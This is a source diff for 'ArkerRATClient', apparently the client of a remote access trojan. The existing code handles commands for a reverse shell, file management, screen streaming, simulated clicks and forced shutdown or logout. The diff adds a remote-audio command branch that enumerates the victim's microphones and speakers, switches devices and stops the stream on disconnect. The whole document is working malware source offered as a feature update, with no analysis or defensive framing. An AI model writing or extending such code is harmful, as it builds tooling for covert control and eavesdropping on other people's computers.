@@ -114,15 +114,13 @@ namespace ArkerRATClient
                         await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                         await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
                         await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
+                        await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
+
 
                         await Task.Run(() => SortData("§ShutDownStart§", "§ShutDownEnd§"));
                         await Task.Run(() => SortData("§RestartStart§", "§RestartEnd§"));
                         await Task.Run(() => SortData("§LogOutStart§", "§LogOutEnd§"));
                         await Task.Run(() => SortData("§SleepStart§", "§SleepEnd§"));
-
-
-
-
 
                         stringBuilder.Clear();
                         }
@@ -167,7 +165,6 @@ namespace ArkerRATClient
                             {      
                                    RemoteDesktop.sendingFrames= true;
                                    Task.Run(()=> RemoteDesktop.StartScreenStreaming(9));
-                                   Task.Run(()=> RemoteDesktop.StartAudioStreaming());
                             }
                             else if (subString.Contains("§KI§"))
                             {
@@ -179,6 +176,32 @@ namespace ArkerRATClient
                             }
                             else if (subString.Contains("§ClickPositionStart§"))
                                 RemoteDesktop.EmulateClick(subString);
+                        }    
+                        else if (startDelimiter=="§RemoteAudioStart§")
+                        {
+                            if(subString.Length == 0)
+                            {
+                                RemoteAudio.ApplySettings();
+                                Task.Run(() => RemoteAudio.GetAndSendOutputDevices());
+                                Task.Run(() => RemoteAudio.GetAndSendInputDevices());
+                            }
+                            else if (subString.Contains("§ODS§"))
+                            {
+                                subString = subString.Replace("§ODS§", string.Empty);
+                                Task.Run(() => RemoteAudio.ChangeOutputDevice(subString));
+
+                            }
+                            else if (subString.Contains("§IDS§"))
+                            {
+                                subString = subString.Replace("§IDS§", string.Empty);
+
+                                Task.Run(() => RemoteAudio.ChangeInputDevice(subString));
+                            }
+                            else if (subString == "close")
+                            {
+                                Task.Run(()=>RemoteAudio.StopRemoteAudio());
+                            }
+
                         }
                         else if(startDelimiter == "§FileManagerStart§")
                         {
@@ -294,6 +317,8 @@ namespace ArkerRATClient
         {
             try
             {
+                RemoteAudio.StopRemoteAudio();
+               
                 tcpClient.Close();
                 serverStream.Close();
             }
